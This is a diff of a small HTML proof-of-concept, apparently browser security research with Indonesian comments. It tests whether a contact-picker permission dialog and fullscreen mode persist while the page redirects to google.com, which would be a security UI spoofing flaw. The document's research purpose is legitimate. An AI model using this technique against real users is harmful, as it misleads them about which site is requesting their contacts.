@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <title>Security UI Spoof - Permission Race Test</title>
+        <title>Security UI Spoof - Redirect Test</title>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
         <style>
@@ -13,39 +13,40 @@
                 justify-content: center;
                 height: 100vh;
                 font-family: sans-serif;
-            }         
+            }
         </style>
         <script>
             onclick = async () => {
-                // 1. Segera lakukan redirect ke google.com
-                window.location.href = "https://www.google.com";
-
-                // 2. Berikan timeout 300ms pada API select kontak
-                // Tujuannya melihat apakah dialog muncul saat halaman google.com mulai dimuat
-                setTimeout(async () => {
+                // 1. Memicu dialog kontak (seperti pada PoC awal)
+                (async () => {
                     try {
                         await navigator.contacts.select(["name"], {});
                     } catch (e) {
-                        console.log("Contact picker diblokir atau gagal karena navigasi");
+                        console.log("Contact picker ditutup/gagal");
                     }
-                }, 50);
+                })();
 
-                // 3. Tetap mencoba masuk Fullscreen untuk melihat persistensi transisi
+                // 2. Masuk ke mode Fullscreen
                 try {
                     if (document.documentElement.requestFullscreen) {
                         await document.documentElement.requestFullscreen();
                     }
                 } catch (e) {
-                    console.log("Fullscreen request failed");
+                    console.log("Fullscreen gagal");
                 }
+
+                // 3. Redirect ke Google dengan timeout 300ms
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 300);
             }
         </script>
     </head>  
     <body>
         <div id="content">
             <center>
-                <h1>Click to Test Permission over Redirect</h1>
-                <p>Redirect starts immediately, Contact API delayed by 300ms.</p>
+                <h1>Click anywhere to trigger Fullscreen and Redirect!</h1>
+                <p>Testing persistence of UI elements during navigation.</p>
             </center>
         </div>
     </body>
